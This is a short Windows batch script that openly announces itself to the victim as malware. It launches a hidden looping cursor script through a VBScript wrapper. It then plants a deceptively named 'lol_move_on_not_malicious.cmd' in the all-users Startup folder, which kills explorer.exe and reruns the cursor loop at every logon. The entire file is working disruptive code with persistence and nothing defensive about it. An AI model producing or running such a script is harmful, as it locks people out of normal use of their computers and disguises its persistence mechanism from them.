@echo off

echo :mouse > mouse.cmd
echo RunDll32.exe user32.dll,SetCursorPos >> mouse.cmd
echo goto mouse >> mouse.cmd
echo Set objShell = WScript.CreateObject("WScript.Shell") > run_mouse.vbs
echo objShell.Run("mouse.cmd"), 0, True >> run_mouse.vbs
start run_mouse.vbs

echo eyy keyboard only run my favourite
set /P goodness="so how do you feel(Good? Bad? Normal?)"

if %goodness%==good ( 
    echo you know that u just ran a malware right?
    echo you are so weird
    echo anyways i am gna install some shady programs dont try to alt f4 it will go worse
    pause
    goto installation
) else (goto installation)

if %goodness%==bad (
    echo well you should feel bad 'CUZ U JUST RAN A MALWARE
    echo oh well i gotta do my duty and install some shady programs
    echo JUST because you feel bad I will allow you to choose
    set /P doesnt_matter="do you want to quit Y/N"
    pause
    goto installation
) else (goto installation)

if %goodness%==normal (    
    echo you know that u just ran a malware right?
    echo you are so weird
    echo anyways i am gna install some shady programs dont try to alt f4 it will go worse
    pause
    goto installation
) else (goto installation)

:installation
cd C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp
echo taskkill /F /IM explorer.exe > lol_move_on_not_malicious.cmd
echo echo ur friccked kiddo >> lol_move_on_not_malicious.cmd
echo :mouse >> lol_move_on_not_malicious.cmd
echo RunDll32.exe user32.dll,SetCursorPos >> lol_move_on_not_malicious.cmd
echo goto mouse >> lol_move_on_not_malicious.cmd